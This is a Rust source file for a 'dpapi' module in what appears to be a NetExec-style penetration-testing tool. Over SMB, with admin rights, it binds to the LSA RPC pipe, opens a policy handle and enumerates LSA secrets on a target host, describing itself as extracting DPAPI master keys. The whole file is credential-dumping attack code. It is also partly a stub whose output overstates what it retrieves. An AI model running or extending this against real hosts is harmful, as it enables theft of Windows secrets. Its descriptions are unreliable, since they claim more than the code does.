use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
use anyhow::Result;
use async_trait::async_trait;
use nxc_protocols::NxcSession;

/// DPAPI and LSA secret extraction module.
pub struct Dpapi;

impl Dpapi {
    pub fn new() -> Self {
        Self
    }
}

impl Default for Dpapi {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for Dpapi {
    fn name(&self) -> &'static str {
        "dpapi"
    }

    fn description(&self) -> &'static str {
        "Extract DPAPI master keys and LSA secrets"
    }

    fn supported_protocols(&self) -> &[&str] {
        &["smb"]
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![]
    }

    async fn run(
        &self,
        session: &mut dyn NxcSession,
        _opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let smb_session = match session.protocol() {
            "smb" => session
                .as_any()
                .downcast_ref::<nxc_protocols::smb::SmbSession>()
                .ok_or_else(|| anyhow::anyhow!("Invalid session type"))?,
            _ => return Err(anyhow::anyhow!("Module only supports SMB (LSA over RPC)")),
        };

        if !smb_session.admin {
            return Err(anyhow::anyhow!("Admin/LSA privileges required for DPAPI dumping"));
        }

        tracing::info!("DPAPI: Extracting master keys from {}", smb_session.target);

        // 1. Connect to \lsarpc or \pipe\lsass
        use nxc_protocols::rpc::{lsarpc, DcerpcBind, DcerpcRequest, PacketType, UUID_LSARPC};
        let protocol = nxc_protocols::smb::SmbProtocol::new();
        let bind = DcerpcBind::new(UUID_LSARPC, 0, 0);
        let _resp =
            protocol.call_rpc(smb_session, "lsarpc", PacketType::Bind, 1, bind.to_bytes()).await?;

        // 2. Bind to MS-LSAD (Local Security Authority)
        let lsar_open_req = lsarpc::build_lsar_open_policy2(&smb_session.target);
        let rpc_req = DcerpcRequest::new(lsarpc::LSAR_OPEN_POLICY2, lsar_open_req);
        let resp = protocol
            .call_rpc(smb_session, "lsarpc", PacketType::Request, 2, rpc_req.to_bytes())
            .await?;

        let mut h_policy = [0u8; 20];
        if resp.len() >= 44 {
            h_policy.copy_from_slice(&resp[24..44]);
        } else {
            return Err(anyhow::anyhow!(
                "Invalid response length for LsarOpenPolicy2: {}",
                resp.len()
            ));
        }

        // 3. Call LsarEnumerateSecrets (Opnum 14) or LsarOpenSecret (Opnum 28)
        let lsar_enum_req = lsarpc::build_lsar_enumerate_secrets(&h_policy);
        let rpc_req2 = DcerpcRequest::new(lsarpc::LSAR_ENUMERATE_SECRETS, lsar_enum_req);
        let resp2 = protocol
            .call_rpc(smb_session, "lsarpc", PacketType::Request, 3, rpc_req2.to_bytes())
            .await?;

        Ok(ModuleResult {
            success: true,
            output: format!(
                "[+] Enumerated LSA Secrets (DPAPI Master Key bounds). Response Length: {}",
                resp2.len()
            ),
            data: serde_json::json!({"master_key_bounds_len": resp2.len()}),
            credentials: vec![],
        })
    }
}
